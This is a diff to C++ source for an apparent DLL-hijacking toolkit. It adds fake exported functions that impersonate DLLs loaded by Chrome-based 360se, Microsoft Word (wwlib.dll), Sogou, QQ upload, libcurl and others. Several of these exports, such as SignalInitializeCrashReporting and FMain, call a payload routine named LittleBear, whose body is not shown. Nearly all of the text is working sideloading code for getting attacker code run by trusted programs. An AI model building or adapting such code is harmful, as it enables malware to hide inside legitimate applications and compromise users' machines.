@@ -29,6 +29,36 @@ using namespace std;
 #else
 #endif
 
+//360se.exe  /n  "mytest.docx"  /o "%u"
+//chrome_elf.dll
+extern "C" __declspec(dllexport) void  SignalInitializeCrashReporting() {
+	//MessageBoxA(0, "SignalInitializeCrashReporting", "SignalInitializeCrashReporting", MB_OK);
+	LittleBear();
+	return ;
+}
+
+//winword.exe
+//wwlib.dll
+extern "C" __declspec(dllexport) int FMain() {
+	LittleBear();
+	//MessageBoxA(0, "FMain", "FMain", MB_OK);
+	return 0;
+}
+
+extern "C" __declspec(dllexport) int wdCommandDispatch()
+{
+	MessageBoxA(0, "wdCommandDispatch", "wdCommandDispatch", MB_OK);
+	//LittleBear();
+	return 0;
+}
+
+extern "C" __declspec(dllexport) int wdGetApplicationObject()
+{
+	MessageBoxA(0, "wdGetApplicationObject", "wdGetApplicationObject", MB_OK);
+	//LittleBear();
+	return 0;
+}
+
 
 //dsktptst.dll
 extern "C" __declspec(dllexport) void* __stdcall SetCommandLine(void* Src) {
@@ -71,7 +101,7 @@ extern "C" __declspec(dllexport) signed int Register()
 #endif
 
 
-
+//firstload.dll
 #ifdef DLLHIJACK_FIRSTLOAD
 extern "C" __declspec(dllexport) int __stdcall Launch(char* a1) {
 	//MessageBoxA(0, "Launch", "Launch", MB_OK);
@@ -115,6 +145,7 @@ extern "C" __declspec(dllexport) void ThunderModule_Uninit() {
 }
 #endif
 
+//libcurl.dll
 #ifdef DLLHIJACK_LIBCURL
 extern "C" __declspec(dllexport) void* __stdcall liburl_1(int a1) {
 	//MessageBoxA(0, "liburl_1", "liburl_1", MB_OK);
@@ -168,7 +199,8 @@ extern "C" __declspec(dllexport) signed int __cdecl curl_easy_setopt(int a1, int
 }
 #endif
 
-
+//sogou.exe
+//sbiedll.dll
 #ifdef DLLHIJACK_SBIEDLL
 extern "C" __declspec(dllexport) signed int SbieApi_Log()
 {
@@ -186,6 +218,7 @@ extern "C" __declspec(dllexport) void __stdcall  SbieDll_Hook(int a1, int a2, in
 #endif
 
 
+//getcurrentdeploy.dll
 #ifdef DLLHIJACK_GETCURRENTROLLBACK
 extern "C" __declspec(dllexport) void  GetCurrentInternal_ReportRollbackEvent()
 {
@@ -201,7 +234,8 @@ int SetClientVerdict()
 }
 #endif
 
-//clover with clover_dll.dll
+//clover.exe
+//clover_dll.dll
 #ifdef DLLHIJACK_CLOVER
 extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain(void)
 {
@@ -211,7 +245,8 @@ extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain(void)
 }
 #endif
 
-
+//qqupload.exe
+//qmnetworkmgr.dll
 #ifdef DLLHIJACK_QQMGRDIARY
 extern "C" __declspec(dllexport) DWORD  __cdecl DestroyQMNetworkMgr(void)
 {
@@ -226,7 +261,7 @@ extern "C" __declspec(dllexport) void __cdecl CreateQMNetworkMgr(DWORD a1)
 }
 #endif
 
-
+//googleservice.dll
 #ifdef DLLHIJACK_GOOGLESERVICE
 extern "C" __declspec(dllexport) int  GoogleServices_1(int a1, int a2, int a3, int a4)
 {
